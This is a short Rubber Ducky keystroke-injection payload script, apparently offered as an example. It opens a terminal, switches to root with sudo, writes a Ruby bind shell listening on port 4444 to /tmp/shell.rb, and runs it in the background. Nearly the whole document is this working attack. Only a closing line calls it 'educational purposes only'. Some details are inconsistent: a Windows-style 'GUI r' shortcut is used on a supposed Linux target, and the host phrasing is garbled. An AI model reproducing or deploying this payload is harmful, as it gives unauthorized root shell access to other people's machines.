
REM Since the Rubber Ducky is a programmable USB device, it can be used to inject keyboard commands into a target computer. Below is an example of a payload script that could be used with a Rubber Ducky to create a bind shell on a Linux server with full admin privileges and listen <server host> on port 4444:

DELAY 1000
GUI r
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING sudo su
ENTER
STRING <password>
ENTER
DELAY 500
STRING echo "require 'socket';server=TCPServer.new('<server host>',4444);client=server.accept;$stdin.reopen(client);$stdout.reopen(client);$stderr.reopen(client);exec '/bin/sh','-i'" > /tmp/shell.rb
ENTER
DELAY 500
STRING /usr/bin/ruby /tmp/shell.rb &
ENTER


REM This script opens a terminal, elevates to root privileges, creates a ruby script that sets up a bind shell <server host> on port 4444, and runs the script in the background. The target server will now be listening <server host> on port 4444 for incoming connections.

REM Please note that using such scripts for unauthorized access is illegal and unethical. This example is provided for educational purposes only.
